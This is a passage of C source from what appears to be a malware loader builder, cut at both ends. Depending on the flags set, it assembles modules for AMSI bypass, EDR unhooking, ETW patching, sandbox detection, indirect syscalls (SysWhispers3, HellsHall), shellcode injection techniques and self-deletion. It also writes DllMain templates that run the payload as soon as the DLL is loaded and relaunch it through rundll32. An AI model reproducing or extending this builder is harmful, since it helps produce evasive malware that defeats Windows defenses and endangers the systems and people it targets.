		createfile_outputfolder("api_hashing.cpp");

		//copy api hash files contents
		copyFileContents_evasionFolder("api_hashing", "typedef.h");
		copyFileContents_evasionFolder("api_hashing", "typedef.c");
		copyFileContents_evasionFolder("api_hashing", "api_hashing.h");
		copyFileContents_evasionFolder("api_hashing", "api_hashing.cpp");

		//create iat camu files
		createfile_outputfolder("iat_camuflage.c");
		createfile_outputfolder("iat_camuflage.h");

		//copy apihash files contents
		copyFileContents_evasionFolder("iat_camuflage", "iat_camuflage.c");
		copyFileContents_evasionFolder("iat_camuflage", "iat_camuflage.h");

		//execute function
		getfilecontentcomment("local_Hol();", "output\\code\\exec.c", "//exec");

	}







	//Optional Flags

		//AMSI
	if (amsiFlag_opensession)
	{
		//Create Files
		createfile_outputfolder("amsi_functions.h");
		createfile_outputfolder("amsiopensession.c");

		//copy contents
		copyFileContents_evasionFolder("amsi", "amsi_functions.h");
		copyFileContents_evasionFolder("amsi", "amsiopensession.c");

		//Print the function to .exec in the //amsi
		getfilecontentcomment("amsiOpeSess();", "output\\code\\exec.c", "//amsi");

	}

	if (amsiFlag_scanbuffer)
	{
		//Create Files
		createfile_outputfolder("amsi_functions.h");
		createfile_outputfolder("amsiscanbuffer.c");

		//copy contents
		copyFileContents_evasionFolder("amsi", "amsi_functions.h");
		copyFileContents_evasionFolder("amsi", "amsiscanbuffer.c");

		//Print the function to .exec in the //amsi
		getfilecontentcomment("amsiScanBuf();", "output\\code\\exec.c", "//amsi");

	}

	if (amsiFlag_signature)
	{
		//Create Files
		createfile_outputfolder("amsi_functions.h");
		createfile_outputfolder("amsisignature.c");

		//copy contents
		copyFileContents_evasionFolder("amsi", "amsi_functions.h");
		copyFileContents_evasionFolder("amsi", "amsisignature.c");

		//Print the function to .exec in the //amsi
		getfilecontentcomment("amsiScanBufsign();", "output\\code\\exec.c", "//amsi");

	}

	if (amsiFlag_codetrust)
	{
		//Create Files
		createfile_outputfolder("amsi_functions.h");
		createfile_outputfolder("codetrust.c");

		//copy contents
		copyFileContents_evasionFolder("amsi", "amsi_functions.h");
		copyFileContents_evasionFolder("amsi", "codetrust.c");

		//Print the function to .exec in the //amsi
		getfilecontentcomment("WlpQueDynCodTru();", "output\\code\\exec.c", "//amsi");

	}


		//Unhooking
	if (unhookingFlag_diskcreatefile)
	{
		//Create Files
		createfile_outputfolder("unhooking_functions.h");
		createfile_outputfolder("unhooking_disk_createfile.c");

		//copy contents
		copyFileContents_evasionFolder("unhooking", "unhooking_functions.h");
		copyFileContents_evasionFolder("unhooking", "unhooking_disk_createfile.c");

		//Print the function to .exec in the //unhook
		getfilecontentcomment("UnhDiskFileMap();", "output\\code\\exec.c", "//unhook");

	}
	
	if (unhookingFlag_knowndlls)
	{
		//Create Files
		createfile_outputfolder("unhooking_functions.h");
		createfile_outputfolder("unhooking_known_dlls.c");

		//copy contents
		copyFileContents_evasionFolder("unhooking", "unhooking_functions.h");
		copyFileContents_evasionFolder("unhooking", "unhooking_known_dlls.c");

		//Print the function to .exec in the //unhook
		getfilecontentcomment("UnhKnownDll();", "output\\code\\exec.c", "//unhook");

	}

	if (unhookingFlag_debug)
	{
		//Create Files
		createfile_outputfolder("unhooking_functions.h");
		createfile_outputfolder("unhooking_process_debug.c");

		//copy contents
		copyFileContents_evasionFolder("unhooking", "unhooking_functions.h");
		copyFileContents_evasionFolder("unhooking", "unhooking_process_debug.c");

		//Print the function to .exec in the //unhook
		getfilecontentcomment("UnhSuspProc();", "output\\code\\exec.c", "//unhook");

	}

	if (unhookingFlag_hookchain)
	{
		//Create Files
		createfile_outputfolder("unhooking_functions.h");
		createfile_outputfolder("windows_common.h");
		createfile_outputfolder("hook.h");
		createfile_outputfolder("hook.c");

		//copy contents
		copyFileContents_evasionFolder("unhooking", "unhooking_functions.h");
		copyFileContents_evasionFolder("unhooking", "windows_common.h");
		copyFileContents_evasionFolder("unhooking", "hook.h");
		copyFileContents_evasionFolder("unhooking", "hook.c");
		copyFileFromFolder("unhooking", "hookchain.obj");

		//Print the function to .exec in the //unhook
		getfilecontentcomment("InitApi();", "output\\code\\exec.c", "//unhook");

	}


		//Etw
	if (etwFlag_eventwrite)
	{
		//Create Files
		createfile_outputfolder("etw.h");
		createfile_outputfolder("etweventwrite.c");

		//copy contents
		copyFileContents_evasionFolder("etw", "etw.h");
		copyFileContents_evasionFolder("etw", "etweventwrite.c");

		//Print the function to .exec in the //unhook
		getfilecontentcomment("EtwEveWri();", "output\\code\\exec.c", "//etw");

	}

	if (etwFlag_TraceEvent)
	{
		//Create Files
		createfile_outputfolder("etw.h");
		createfile_outputfolder("ntTraceEvent.c");

		//copy contents
		copyFileContents_evasionFolder("etw", "etw.h");
		copyFileContents_evasionFolder("etw", "ntTraceEvent.c");

		//Print the function to .exec in the //unhook
		getfilecontentcomment("EtwTraEve();", "output\\code\\exec.c", "//etw");

	}

	if (etwFlag_peventwritefull)
	{
		//Create Files
		createfile_outputfolder("etw.h");
		createfile_outputfolder("etwpeventwritefull.c");

		//copy contents
		copyFileContents_evasionFolder("etw", "etw.h");
		copyFileContents_evasionFolder("etw", "etwpeventwritefull.c");

		//Print the function to .exec in the //unhook
		getfilecontentcomment("EtwpEveWriFulStar();", "output\\code\\exec.c", "//etw");

	}


		//Sandbox
	if (sandboxFlag_apihammering)
	{
		//Create Files
		createfile_outputfolder("sandbox.h");
		createfile_outputfolder("apihammering.c");

		//copy contents
		copyFileContents_evasionFolder("sandbox", "sandbox.h");
		copyFileContents_evasionFolder("sandbox", "apihammering.c");

		//Print the function to .exec in the //unhook
		getfilecontentcomment("ApiHam();", "output\\code\\exec.c", "//sandbox");

	}

	if (sandboxFlag_mouseclicks)
	{
		//Create Files
		createfile_outputfolder("sandbox.h");
		createfile_outputfolder("mouse_clicks.c");

		//copy contents
		copyFileContents_evasionFolder("sandbox", "sandbox.h");
		copyFileContents_evasionFolder("sandbox", "mouse_clicks.c");

		//Print the function to .exec in the //unhook
		getfilecontentcomment("MouCli();", "output\\code\\exec.c", "//sandbox");

	}

	if (sandboxFlag_resolution)
	{
		//Create Files
		createfile_outputfolder("sandbox.h");
		createfile_outputfolder("monitor.c");

		//copy contents
		copyFileContents_evasionFolder("sandbox", "sandbox.h");
		copyFileContents_evasionFolder("sandbox", "monitor.c");

		//Print the function to .exec in the //unhook
		getfilecontentcomment("resolution();", "output\\code\\exec.c", "//sandbox");

	}

	if (sandboxFlag_processes)
	{
		//Create Files
		createfile_outputfolder("sandbox.h");
		createfile_outputfolder("processes.c");

		//copy contents
		copyFileContents_evasionFolder("sandbox", "sandbox.h");
		copyFileContents_evasionFolder("sandbox", "processes.c");

		//Print the function to .exec in the //unhook
		getfilecontentcomment("CheckProcesses();", "output\\code\\exec.c", "//sandbox");

	}

	if (sandboxFlag_hardware)
	{
		//Create Files
		createfile_outputfolder("sandbox.h");
		createfile_outputfolder("hardware.c");

		//copy contents
		copyFileContents_evasionFolder("sandbox", "sandbox.h");
		copyFileContents_evasionFolder("sandbox", "hardware.c");

		//Print the function to .exec in the //unhook
		getfilecontentcomment("hardware();", "output\\code\\exec.c", "//sandbox");

	}

	if (sandboxFlag_mwfmoex)
	{
		//Create Files
		createfile_outputfolder("sandbox.h");
		createfile_outputfolder("msgwaitformultipleobjectsex.c");

		//copy contents
		copyFileContents_evasionFolder("sandbox", "sandbox.h");
		copyFileContents_evasionFolder("sandbox", "msgwaitformultipleobjectsex.c");

		//Print the function to .exec in the //sandbox
		getfilecontentcomment("DelayMultipleObjectsEx();", "output\\code\\exec.c", "//sandbox");

	}

	if (sandboxFlag_ntdelay)
	{
		//Create Files
		createfile_outputfolder("sandbox.h");
		createfile_outputfolder("ntdelayexecution.c");

		//copy contents
		copyFileContents_evasionFolder("sandbox", "sandbox.h");
		copyFileContents_evasionFolder("sandbox", "ntdelayexecution.c");

		//Print the function to .exec in the //sandbox
		getfilecontentcomment("NtDelay();", "output\\code\\exec.c", "//sandbox");

	}

	if (sandboxFlag_fibonacci)
	{
		//Create Files
		createfile_outputfolder("sandbox.h");
		createfile_outputfolder("Fibonacci.c");

		//copy contents
		copyFileContents_evasionFolder("sandbox", "sandbox.h");
		copyFileContents_evasionFolder("sandbox", "Fibonacci.c");

		//Print the function to .exec in the //sandbox
		getfilecontentcomment("Fibo();", "output\\code\\exec.c", "//sandbox");

	}

		//Payload Control

	if (payloadFlag_control)
	{
		//Create Files
		createfile_outputfolder("payloadcontrol.h");
		createfile_outputfolder("semaphore.c");

		//copy contents
		copyFileContents_evasionFolder("payload_control", "payloadcontrol.h");
		copyFileContents_evasionFolder("payload_control", "semaphore.c");

		//Print the function to .exec in the //control
		getfilecontentcomment("running();", "output\\code\\exec.c", "//control");

	}

	if (payloadFlag_selfdelete)
	{
		//Create Files
		createfile_outputfolder("payloadcontrol.h");
		createfile_outputfolder("self-del.c");

		//copy contents
		copyFileContents_evasionFolder("payload_control", "payloadcontrol.h");
		copyFileContents_evasionFolder("payload_control", "self-del.c");

		//Print the function to .exec in the //control
		getfilecontentcomment("selfdel();", "output\\code\\exec.c", "//control");

	}


	if (indirectFlag_syswhispers)
	{
		//Execution

			//init syscalls
		createfile_outputfolder("syscalls.c");
		copyFileContents_evasionFolder("syswhispers3\\init", "syscalls.c");
		

		createfile_outputfolder("syscalls.h");
		copyFileContents_evasionFolder("syswhispers3\\init", "syscalls.h");


		copyFileFromFolder("syswhispers3\\init", "syscalls.obj");
		copyFileFromFolder("syswhispers3\\init", "syscalls_llvm_c.obj");

		if (strlen(compileFlags) > 0) {
			strcat(compileFlags, " ");
		}
		strcat(compileFlags, "init-syswhispers");


			//apc
		if (normal_apc)
		{


			if (strlen(compileFlags) > 0) {
				strcat(compileFlags, " ");
			}
			strcat(compileFlags, "syswhispers-apc");

			//copy contents for hellshall apc
			copyFileContents_evasionFolder("syswhispers3\\execution\\apc", "apc.c");
		}

			//early_bird_debug
		if (normal_Early_Bird_Debug)
		{
			if (strlen(compileFlags) > 0) {
				strcat(compileFlags, " ");
			}
			strcat(compileFlags, "syswhispers-earlybird-debug");

			copyFileContents_evasionFolder("syswhispers3\\execution\\early_bird_debug", "early_bird_debug.c");

		}

			//early_bird_suspended
		if (normal_Early_Bird_Suspended)
		{
			if (strlen(compileFlags) > 0) {
				strcat(compileFlags, " ");
			}
			strcat(compileFlags, "syswhispers-earlybird-suspended");
			copyFileContents_evasionFolder("syswhispers3\\execution\\early_bird_suspended", "early_bird_suspended.c");
		}
		
			//enumthreadwindows
		if (normal_EnumThreadWindows)
		{
			if (strlen(compileFlags) > 0) {
				strcat(compileFlags, " ");
			}
			strcat(compileFlags, "syswhispers-enumthreadwindows");
			copyFileContents_evasionFolder("syswhispers3\\execution\\callback_enumthreadwindows", "callback_enumthreadwindows.c");
		}
		
			//local_mapping_inject

		if (normal_Local_Mapping_Inject)
		{
			if (strlen(compileFlags) > 0) {
				strcat(compileFlags, " ");
			}
			strcat(compileFlags, "syswhispers-localmapping");
			copyFileContents_evasionFolder("syswhispers3\\execution\\local_mapping", "local_mapping.c");
		}

			//early cascade

		if (normal_Early_Cascade)
		{
			if (strlen(compileFlags) > 0) {
				strcat(compileFlags, " ");
			}
			strcat(compileFlags, "syswhispers-earlycascade");
			copyFileContents_evasionFolder("syswhispers3\\execution\\early_cascade", "earlycascade.c");
		}
		
			//fibers

		if (normal_fibers)
		{
			if (strlen(compileFlags) > 0) {
				strcat(compileFlags, " ");
			}
			strcat(compileFlags, "syswhispers-fibers");
			copyFileContents_evasionFolder("syswhispers3\\execution\\fibers", "fibers.c");
		}
		
			//process hypnosis

		if (normal_hypnosis)
		{
			if (strlen(compileFlags) > 0) {
				strcat(compileFlags, " ");
			}
			strcat(compileFlags, "syswhispers-hypnosis");
			copyFileContents_evasionFolder("syswhispers3\\execution\\process_hypnosis", "process_hypnosis.c");
		}

			//thread pools

		if (normal_tpalloc)
		{
			if (strlen(compileFlags) > 0) {
				strcat(compileFlags, " ");
			}
			strcat(compileFlags, "syswhispers-tpalloc");
			copyFileContents_evasionFolder("syswhispers3\\execution\\tpallocinject", "tpallocinject.c");
		}
		
			//local hollowing

		if (normal_local_hollowing)
		{
			if (strlen(compileFlags) > 0) {
				strcat(compileFlags, " ");
			}
			strcat(compileFlags, "syswhispers-local-hollowing");
			copyFileContents_evasionFolder("syswhispers3\\execution\\local_hollowing", "local_hollowing.c");
		}

		//amsi

			//amsi opensession

		if (amsiFlag_opensession)
		{
			if (strlen(compileFlags) > 0) {
				strcat(compileFlags, " ");
			}
			strcat(compileFlags, "syswhispers-amsi-opensession");
			copyFileContents_evasionFolder("syswhispers3\\evasion\\amsi", "amsiopensession.c");
		}
		
			//amsi scanbuffer

		if (amsiFlag_scanbuffer)
		{
			if (strlen(compileFlags) > 0) {
				strcat(compileFlags, " ");
			}
			strcat(compileFlags, "syswhispers-amsi-scanbuffer");
			copyFileContents_evasionFolder("syswhispers3\\evasion\\amsi", "amsiscanbuffer.c");
		}
		
			//amsi signature

		if (amsiFlag_signature)
		{
			if (strlen(compileFlags) > 0) {
				strcat(compileFlags, " ");
			}
			strcat(compileFlags, "syswhispers-amsi-signature");
			copyFileContents_evasionFolder("syswhispers3\\evasion\\amsi", "amsisignature.c");
		}

			//amsi codetrust

		if (amsiFlag_codetrust)
		{
			if (strlen(compileFlags) > 0) {
				strcat(compileFlags, " ");
			}
			strcat(compileFlags, "syswhispers-amsi-codetrust");
			copyFileContents_evasionFolder("syswhispers3\\evasion\\amsi", "codetrust.c");
		}

		//Unhooking

			//disk createfile
		if (unhookingFlag_diskcreatefile)
		{
			if (strlen(compileFlags) > 0) {
				strcat(compileFlags, " ");
			}
			strcat(compileFlags, "syswhispers-unhooking-createfile");
			copyFileContents_evasionFolder("syswhispers3\\evasion\\unhooking", "unhooking_disk_createfile.c");
		}

			//known dlls
		if (unhookingFlag_knowndlls)
		{
			if (strlen(compileFlags) > 0) {
				strcat(compileFlags, " ");
			}
			strcat(compileFlags, "syswhispers-unhooking-known-dlls");
			copyFileContents_evasionFolder("syswhispers3\\evasion\\unhooking", "unhooking_known_dlls.c");
		}
		
			//process debug
		if (unhookingFlag_debug)
		{
			if (strlen(compileFlags) > 0) {
				strcat(compileFlags, " ");
			}
			strcat(compileFlags, "syswhispers-unhooking-debug");
			copyFileContents_evasionFolder("syswhispers3\\evasion\\unhooking", "unhooking_process_debug.c");
		}
		
			//hookchain
		if (unhookingFlag_hookchain)
		{
			if (strlen(compileFlags) > 0) {
				strcat(compileFlags, " ");
			}
			strcat(compileFlags, "syswhispers-unhooking-hookchain");
			copyFileContents_evasionFolder("syswhispers3\\evasion\\unhooking", "hook.c");
		}

		//etw
		
			//eventwrite
		if (etwFlag_eventwrite)
		{
			if (strlen(compileFlags) > 0) {
				strcat(compileFlags, " ");
			}
			strcat(compileFlags, "syswhispers-etw-eventwrite");
			copyFileContents_evasionFolder("syswhispers3\\evasion\\etw", "etweventwrite.c");
		}
			
			//TraceEvent
		if (etwFlag_TraceEvent)
		{
			if (strlen(compileFlags) > 0) {
				strcat(compileFlags, " ");
			}
			strcat(compileFlags, "syswhispers-etw-traceevent");
			copyFileContents_evasionFolder("syswhispers3\\evasion\\etw", "ntTraceEvent.c");
		}

			//peventwritefull

		if (etwFlag_peventwritefull)
		{
			if (strlen(compileFlags) > 0) {
				strcat(compileFlags, " ");
			}
			strcat(compileFlags, "syswhispers-etw-peventwritefull");
			copyFileContents_evasionFolder("syswhispers3\\evasion\\etw", "etwpeventwritefull.c");
		}


	}



		
		//Indirect Syscalls
	if (indirectFlag_hellshall)

	{	
		//Execution
		
			//init syscalls
		createfile_outputfolder("init.c");
		copyFileContents_evasionFolder("hells_hall\\init", "init.c");

		createfile_outputfolder("init.h");
		copyFileContents_evasionFolder("hells_hall\\init", "init.h");

		createfile_outputfolder("HellsHall.c");
		copyFileContents_evasionFolder("hells_hall\\init", "HellsHall.c");

		createfile_outputfolder("HellsHall.h");
		copyFileContents_evasionFolder("hells_hall\\init", "HellsHall.h");

		createfile_outputfolder("Structs.h");
		copyFileContents_evasionFolder("hells_hall\\init", "Structs.h");

		copyFileFromFolder("hells_hall\\init", "HellsAsm.obj");

		getfilecontentcomment("Ntcall();", "output\\code\\exec.c", "//hells");

		if (strlen(compileFlags) > 0) {
			strcat(compileFlags, " ");
		}
		strcat(compileFlags, "init-syscalls");


			//apc
		if (normal_apc) 
		{


			if (strlen(compileFlags) > 0) {
				strcat(compileFlags, " ");
			}
			strcat(compileFlags, "hellshall-apc");

			//copy contents for hellshall apc
			copyFileContents_evasionFolder("hells_hall\\execution\\apc", "apc.c");
		}


			//early_bird_debug
		if (normal_Early_Bird_Debug) 
		{

			if (strlen(compileFlags) > 0) {
				strcat(compileFlags, " ");
			}
			strcat(compileFlags, "hellshall-earlybird-debug");


			//copy contents for hellshall early_bird_debug
			copyFileContents_evasionFolder("hells_hall\\execution\\early_bird_debug", "early_bird_debug.c");

		}
			//early_bird_suspended
		if (normal_Early_Bird_Suspended)
		{

			if (strlen(compileFlags) > 0) {
				strcat(compileFlags, " ");
			}
			strcat(compileFlags, "hellshall-earlybird-suspended");


			//copy contents for hellshall early_bird_debug
			copyFileContents_evasionFolder("hells_hall\\execution\\early_bird_suspended", "early_bird_suspended.c");

		}

			//enumthreadwindows
		if (normal_EnumThreadWindows)
		{
			if (strlen(compileFlags) > 0) {
				strcat(compileFlags, " ");
			}
			strcat(compileFlags, "hellshall-enumthreadwindows");

			copyFileContents_evasionFolder("hells_hall\\execution\\callback_enumthreadwindows", "callback_enumthreadwindows.c");

		}
		
			//local_mapping_inject
		if (normal_Local_Mapping_Inject)
		{
			if (strlen(compileFlags) > 0) {
				strcat(compileFlags, " ");
			}
			strcat(compileFlags, "hellshall-localmapping");

			copyFileContents_evasionFolder("hells_hall\\execution\\local_mapping", "local_mapping.c");
		}
		
			//early cascade
		if (normal_Early_Cascade)
		{
			if (strlen(compileFlags) > 0) {
				strcat(compileFlags, " ");
			}
			strcat(compileFlags, "hellshall-earlycascade");
			copyFileContents_evasionFolder("hells_hall\\execution\\early_cascade", "earlycascade.c");
		}

			//fibers
		if (normal_fibers)
		{
			if (strlen(compileFlags) > 0) {
				strcat(compileFlags, " ");
			}
			strcat(compileFlags, "hellshall-fibers");
			copyFileContents_evasionFolder("hells_hall\\execution\\fibers", "fibers.c");
		}

			//process hypnosis	
		if (normal_hypnosis)
		{
			if (strlen(compileFlags) > 0) {
				strcat(compileFlags, " ");
			}
			strcat(compileFlags, "hellshall-hypnosis");
			copyFileContents_evasionFolder("hells_hall\\execution\\process_hypnosis", "process_hypnosis.c");
		}
			//thread pools
		if (normal_tpalloc)
		{
			if (strlen(compileFlags) > 0) {
				strcat(compileFlags, " ");
			}
			strcat(compileFlags, "hellshall-tpalloc");
			copyFileContents_evasionFolder("hells_hall\\execution\\tpallocinject", "tpallocinject.c");
		}


			//local hollowing
		if (normal_local_hollowing)
		{
			if (strlen(compileFlags) > 0) {
				strcat(compileFlags, " ");
			}
			strcat(compileFlags, "hellshall-local-hollowing");
			copyFileContents_evasionFolder("hells_hall\\execution\\local_hollowing", "local_hollowing.c");
		}


		//Amsi
		
			//amsi opensession
		if (amsiFlag_opensession)
		{
			if (strlen(compileFlags) > 0) {
				strcat(compileFlags, " ");
			}
			strcat(compileFlags, "hellshall-amsi-opensession");
			copyFileContents_evasionFolder("hells_hall\\evasion\\amsi", "amsiopensession.c");
		}
			//amsi scanbuffer

		if (amsiFlag_scanbuffer)
		{
			if (strlen(compileFlags) > 0) {
				strcat(compileFlags, " ");
			}
			strcat(compileFlags, "hellshall-amsi-scanbuf");
			copyFileContents_evasionFolder("hells_hall\\evasion\\amsi", "amsiscanbuffer.c");
		}

			//amsi signature

		if (amsiFlag_signature)
		{
			if (strlen(compileFlags) > 0) {
				strcat(compileFlags, " ");
			}
			strcat(compileFlags, "hellshall-amsi-signature");
			copyFileContents_evasionFolder("hells_hall\\evasion\\amsi", "amsisignature.c");
		}
			//amsi codetrust

		if (amsiFlag_codetrust)
		{
			if (strlen(compileFlags) > 0) {
				strcat(compileFlags, " ");
			}
			strcat(compileFlags, "hellshall-amsi-codetrust");
			copyFileContents_evasionFolder("hells_hall\\evasion\\amsi", "codetrust.c");
		}

		//Unhooking
		
			//disk createfile
		if (unhookingFlag_diskcreatefile)
		{
			if (strlen(compileFlags) > 0) {
				strcat(compileFlags, " ");
			}
			strcat(compileFlags, "hellshall-unhooking-createfile");
			copyFileContents_evasionFolder("hells_hall\\evasion\\unhooking", "unhooking_disk_createfile.c");
		}

			//known dlls
		if (unhookingFlag_knowndlls)
		{
			if (strlen(compileFlags) > 0) {
				strcat(compileFlags, " ");
			}
			strcat(compileFlags, "hellshall-unhooking-knowndlls");
			copyFileContents_evasionFolder("hells_hall\\evasion\\unhooking", "unhooking_known_dlls.c");
		}

			//unhooking debug
		if (unhookingFlag_debug)
		{
			if (strlen(compileFlags) > 0) {
				strcat(compileFlags, " ");
			}
			strcat(compileFlags, "hellshall-unhooking-debug");
			copyFileContents_evasionFolder("hells_hall\\evasion\\unhooking", "unhooking_process_debug.c");
		}

			//hookchain
		if (unhookingFlag_hookchain)
		{
			if (strlen(compileFlags) > 0) {
				strcat(compileFlags, " ");
			}
			strcat(compileFlags, "hellshall-unhooking-hookchain");
			copyFileContents_evasionFolder("hells_hall\\evasion\\unhooking", "hook.c");
		}

		//etw
		
			//etw eventwrite
		if (etwFlag_eventwrite)
		{
			if (strlen(compileFlags) > 0) {
				strcat(compileFlags, " ");
			}
			strcat(compileFlags, "hellshall-etw-eventwrite");
			copyFileContents_evasionFolder("hells_hall\\evasion\\etw", "etweventwrite.c");
		}
				//etw traceevent

		if (etwFlag_TraceEvent)
		{
			if (strlen(compileFlags) > 0) {
				strcat(compileFlags, " ");
			}
			strcat(compileFlags, "hellshall-etw-traceevent");
			copyFileContents_evasionFolder("hells_hall\\evasion\\etw", "ntTraceEvent.c");
		}

			//etw peventwritefull

		if (etwFlag_peventwritefull)
		{
			if (strlen(compileFlags) > 0) {
				strcat(compileFlags, " ");
			}
			strcat(compileFlags, "hellshall-etw-peventwritefull");
			copyFileContents_evasionFolder("hells_hall\\evasion\\etw", "etwpeventwritefull.c");
		}




	}



		//Misc

	if (miscFlag_dll) {
		//Create Files
		createfile_outputfolder("dll.h");
		createfile_outputfolder("dllmain.cpp");

		//copy contents
		copyFileContents_miscFolder("dll", "dll.h");
		copyFileContents_miscFolder("dll", "start.c");

		if (dllExportName != NULL) {
			// Create custom dllmain.cpp with specified export name
			FILE* dllMainFile;
			char dllMainPath[MAX_PATH];
			char exePath[MAX_PATH];
			GetModuleFileNameA(NULL, exePath, MAX_PATH);
			char* lastSlash = strrchr(exePath, '\\');
			if (lastSlash) *lastSlash = '\0';

			sprintf(dllMainPath, "%s\\output\\code\\dllmain.cpp", exePath);
			dllMainFile = fopen(dllMainPath, "w");

			if (dllMainFile) {
				// Write custom dllmain.cpp with specified export name - provide the name for all 3 %s placeholders
				fprintf(dllMainFile,
					"#define _CRT_SECURE_NO_WARNINGS\n"
					"#include <windows.h>\n"
					"#include \"dll.h\"\n\n"
					"static void %s()\n"
					"{\n"
					"    wmain();\n"
					"}\n\n"
					"extern \"C\" __declspec(dllexport) void CALLBACK %s(\n"
					"    HWND hwnd,\n"
					"    HINSTANCE hinst,\n"
					"    LPSTR lpszCmdLine,\n"
					"    int nCmdShow)\n"
					"{\n"
					"    %s();\n"
					"}\n\n"
					"extern \"C\" int process(HMODULE hModule)\n"
					"{\n"
					"    char exePath[MAX_PATH];\n"
					"    GetModuleFileNameA(NULL, exePath, MAX_PATH);\n"
					"    char* exeName = exePath;\n"
					"    char* pos = strrchr(exePath, '\\\\');\n"
					"    if (pos)\n"
					"    {\n"
					"        exeName = pos + 1;\n"
					"    }\n"
					"    if (_stricmp(exeName, \"rundll32.exe\") != 0)\n"
					"    {\n"
					"        char dllPath[MAX_PATH];\n"
					"        GetModuleFileNameA(hModule, dllPath, MAX_PATH);\n"
					"        char systemDir[MAX_PATH];\n"
					"        GetSystemDirectoryA(systemDir, MAX_PATH);\n"
					"        char cmdLine[MAX_PATH * 2];\n"
					"        strcpy(cmdLine, \"\\\"\");\n"
					"        strcat(cmdLine, systemDir);\n"
					"        strcat(cmdLine, \"\\\\rundll32.exe\\\" \\\"\");\n"
					"        strcat(cmdLine, dllPath);\n"
					"        strcat(cmdLine, \"\\\",%s\");\n"
					"        STARTUPINFOA si = { 0 };\n"
					"        PROCESS_INFORMATION pi = { 0 };\n"
					"        si.cb = sizeof(si);\n"
					"        BOOL success = CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);\n"
					"        if (success)\n"
					"        {\n"
					"            CloseHandle(pi.hProcess);\n"
					"            CloseHandle(pi.hThread);\n"
					"        }\n"
					"    }\n"
					"    return 0;\n"
					"}\n\n"
					"BOOL WINAPI DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)\n"
					"{\n"
					"    if (ul_reason_for_call == DLL_PROCESS_ATTACH)\n"
					"    {\n"
					"        process(hModule);\n"
					"    }\n"
					"    return TRUE;\n"
					"}\n",
					dllExportName, dllExportName, dllExportName, dllExportName);

				fclose(dllMainFile);
				printf("[+] DLL configured with export function: %s\n", dllExportName);
			}
		}
		else {
			// Use default dllmain.cpp
			copyFileContents_miscFolder("dll", "dllmain.cpp");
		}
	}

	if (miscFlag2_dll) {
		//Create Files
		createfile_outputfolder("dll.h");
		createfile_outputfolder("dllmain.cpp");

		//copy contents
		copyFileContents_miscFolder("dll", "dll.h");

		if (dllExportName != NULL) {
			// Create custom dllmain.cpp with specified export name
			FILE* dllMainFile;
			char dllMainPath[MAX_PATH];
			char exePath[MAX_PATH];
			GetModuleFileNameA(NULL, exePath, MAX_PATH);
			char* lastSlash = strrchr(exePath, '\\');
			if (lastSlash) *lastSlash = '\0';

			sprintf(dllMainPath, "%s\\output\\code\\dllmain.cpp", exePath);
			dllMainFile = fopen(dllMainPath, "w");

			if (dllMainFile) {
				// Write custom dllmain.cpp with specified export name - provide the name for all 3 %s placeholders
				fprintf(dllMainFile,
					"#include <windows.h>\n"
					"#include \"dll.h\"\n\n"
					"static void %s()\n"
					"{\n"
					"    wmain();\n"
					"}\n\n"
					"extern \"C\" __declspec(dllexport) void CALLBACK %s(\n"
					"    HWND hwnd,\n"
					"    HINSTANCE hinst,\n"
					"    LPSTR lpszCmdLine,\n"
					"    int nCmdShow\n"
					") \n"
					"{\n"
					"    wmain(); \n"
					"}\n\n"
					"BOOL WINAPI DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {\n"
					"    switch (ul_reason_for_call) {\n"
					"    case DLL_PROCESS_ATTACH:\n"
					"        %s();\n"
					"        break;\n"
					"    case DLL_THREAD_ATTACH:\n"
					"    case DLL_THREAD_DETACH:\n"
					"    case DLL_PROCESS_DETACH:\n"
					"        break;\n"
					"    }\n"
					"    return TRUE;\n"
					"}\n",
					dllExportName, dllExportName, dllExportName);

				fclose(dllMainFile);
				printf("[+] DLL configured with export function: %s\n", dllExportName);
			}
		}
		else {
			// Use default dllmain.cpp
			copyFileContents_miscFolder("dll_stealthy", "dllmain.cpp");
		}
	}




	if (miscFlag_serviice)
	{
		//Create Files
		createfile_outputfolder("service.h");
		createfile_outputfolder("service.c");

		//copy contents
		copyFileContents_miscFolder("service", "service.h");
		copyFileContents_miscFolder("service", "service.c");

	}


	if (miscFlag_printf)
	{
		//remove printf from *.c
		removePrintfStatements();

	}

	

	// Compiling
	


	//amsi flags
	if (amsiFlag_opensession) {
		strcat(compileFlags, "amsi-opensession");
	}

	if (amsiFlag_scanbuffer) {
		strcat(compileFlags, "amsi-scanbuffer");
	}

	if (amsiFlag_signature) {
		strcat(compileFlags, "amsi-signature");
	}

	if (amsiFlag_codetrust) {
		strcat(compileFlags, "amsi-codetrust");
	}

	//unhooking flags
	if (unhookingFlag_diskcreatefile) {
		// Only add a space if there's already content in the string
		if (strlen(compileFlags) > 0) {
			strcat(compileFlags, " ");
		}
		strcat(compileFlags, "unhooking-createfile");
	}

	if (unhookingFlag_knowndlls) {
		// Only add a space if there's already content in the string
		if (strlen(compileFlags) > 0) {
			strcat(compileFlags, " ");
		}
		strcat(compileFlags, "unhooking-knowndlls");
	}

	if (unhookingFlag_debug) {
		// Only add a space if there's already content in the string
		if (strlen(compileFlags) > 0) {
			strcat(compileFlags, " ");
		}
		strcat(compileFlags, "unhooking-debug");
	}

	if (unhookingFlag_hookchain) {
		// Only add a space if there's already content in the string
		if (strlen(compileFlags) > 0) {
			strcat(compileFlags, " ");
		}
		strcat(compileFlags, "hookchain");
	}

	//etw

	if (etwFlag_eventwrite) {
		// Only add a space if there's already content in the string
		if (strlen(compileFlags) > 0) {
			strcat(compileFlags, " ");
		}
		strcat(compileFlags, "etw-eventwrite");
	}

	if (etwFlag_TraceEvent) {
		// Only add a space if there's already content in the string
		if (strlen(compileFlags) > 0) {
			strcat(compileFlags, " ");
		}
		strcat(compileFlags, "etw-trace-event");
	}

	if (etwFlag_peventwritefull) {
		// Only add a space if there's already content in the string
		if (strlen(compileFlags) > 0) {
			strcat(compileFlags, " ");
		}
		strcat(compileFlags, "etw-peventwritefull");
	}

	//sandbox

	if (sandboxFlag_apihammering) {
		// Only add a space if there's already content in the string
		if (strlen(compileFlags) > 0) {
			strcat(compileFlags, " ");
		}
		strcat(compileFlags, "api-hammering");
	}

	if (sandboxFlag_mouseclicks) {
		// Only add a space if there's already content in the string
		if (strlen(compileFlags) > 0) {
			strcat(compileFlags, " ");
		}
		strcat(compileFlags, "mouse-clicks");
	}

	if (sandboxFlag_resolution) {
		// Only add a space if there's already content in the string
		if (strlen(compileFlags) > 0) {
